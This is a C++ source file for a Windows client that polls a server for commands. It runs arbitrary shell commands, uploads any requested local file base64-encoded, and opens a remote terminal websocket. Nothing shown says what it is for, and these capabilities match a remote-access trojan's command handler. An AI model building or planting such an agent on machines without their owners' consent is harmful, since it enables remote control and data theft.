#include "commands.h"
#include "client.h"
#include "terminal.h"
#include <windows.h>
#include <sstream>
#include <iostream>
#include <vector>
#include <regex>
#include <cstdio>
#include <fstream>
#include <sstream>
#include <utility>

std::vector<CommandInfo> fetchPendingCommands(const Config& cfg) {
    std::vector<CommandInfo> cmds;
    std::string endpoint = "/api/clients/" + cfg.clientID + "/commands";
    std::string resp;
    if (!httpGet(cfg, endpoint, resp)) return cmds;
    std::regex re(R"("id"\s*:\s*"([^"]+)"[^}]*"type"\s*:\s*"([^"]+)")");
    auto begin = std::sregex_iterator(resp.begin(), resp.end(), re);
    auto end = std::sregex_iterator();
    for (auto i = begin; i != end; ++i) {
        std::smatch m = *i;
        CommandInfo ci;
        ci.id = m[1];
        ci.type = m[2];
        ci.command = "";
        ci.path = "";
        if (ci.type == "exec") {
            std::regex cmdRe(R"("command"\s*:\s*"([^"]*)")");
            std::smatch cmdM;
            std::string remaining = resp.substr(m.position());
            if (std::regex_search(remaining, cmdM, cmdRe)) {
                ci.command = cmdM[1];
            }
        } else if (ci.type == "download") {
            std::regex pathRe(R"("path"\s*:\s*"([^"]*)")");
            std::smatch pathM;
            std::string remaining = resp.substr(m.position());
            if (std::regex_search(remaining, pathM, pathRe)) {
                ci.path = pathM[1];
            }
        }
        cmds.push_back(ci);
    }
    return cmds;
}

bool ackCommand(const Config& cfg, const std::string& command_id) {
    std::string endpoint = "/api/commands/ack";
    std::ostringstream oss;
    oss << "{\"command_id\":\"" << command_id << "\"}";
    std::string resp;
    return httpPost(cfg, endpoint, oss.str(), resp);
}

bool sendCommandResult(const Config& cfg, const std::string& command_id, const std::string& result, const std::string& error, bool resultIsRawJson) {
    std::string endpoint = "/api/commands/result";
    std::ostringstream oss;
    oss << "{\"command_id\":\"" << command_id << "\","
        << "\"result\":" << (result.empty() ? "null" : (resultIsRawJson ? result : "\"" + escapeJson(result) + "\"")) << ","
        << "\"error\":\"" << escapeJson(error) << "\"}";
    std::string resp;
    return httpPost(cfg, endpoint, oss.str(), resp);
}

static std::pair<std::string, int> execCommandCapture(const std::string& cmd) {
    std::string output;
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return {"", -1};
    char buffer[256];
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        output += buffer;
    }
    int exitCode = _pclose(pipe);
    return {output, exitCode};
}

static std::string base64Encode(const std::vector<unsigned char>& data) {
    static const char* b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    int val = 0, valb = -6;
    for (unsigned char c : data) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back(b64chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) out.push_back(b64chars[((val << 8) >> (valb + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

static std::string basenameOf(const std::string& path) {
    size_t pos = path.find_last_of("\\/");
    return (pos == std::string::npos) ? path : path.substr(pos + 1);
}

void processCommands(const Config& cfg) {
    auto cmds = fetchPendingCommands(cfg);
    for (const auto& cmd : cmds) {
        ackCommand(cfg, cmd.id);
        std::string result;
        std::string error;
        if (cmd.type == "exec") {
            auto [output, exitCode] = execCommandCapture(cmd.command);
            result = output;
            if (exitCode != 0) {
                error = "exit code " + std::to_string(exitCode);
            }
        } else if (cmd.type == "download") {
            if (cmd.path.empty()) {
                error = "missing path payload";
            } else {
                std::ifstream file(cmd.path, std::ios::binary);
                if (!file) {
                    error = "cannot read file: " + cmd.path;
                } else {
                    std::vector<unsigned char> data((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    std::string b64 = base64Encode(data);
                    std::ostringstream oss;
                    oss << "{\"name\":\"" << escapeJson(basenameOf(cmd.path)) << "\","
                        << "\"content\":\"" << b64 << "\","
                        << "\"size\":\"" << data.size() << "\"}";
                    result = oss.str();
                }
            }
        } else if (cmd.type == "terminal_start") {
            startTerminalWS(cfg);
            result = "terminal ws connecting";
        } else if (cmd.type == "terminal_end") {
            stopTerminalWS();
            result = "terminal ws disconnected";
        } else {
            error = "Unsupported command type: " + cmd.type;
        }
        sendCommandResult(cfg, cmd.id, result, error, cmd.type == "download");
    }
}

std::string escapeJson(const std::string& s) {
    std::ostringstream o; for (auto c: s) {
        switch (c) {
            case '\\': o << "\\\\"; break;
            case '"': o << "\\\""; break;
            case '\n': o << "\\n"; break;
            case '\r': o << "\\r"; break;
            case '\t': o << "\\t"; break;
            default:
                if (static_cast<unsigned char>(c) < 0x20) {
                    o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)c;
                } else o << c;
        }
    } return o.str();
}
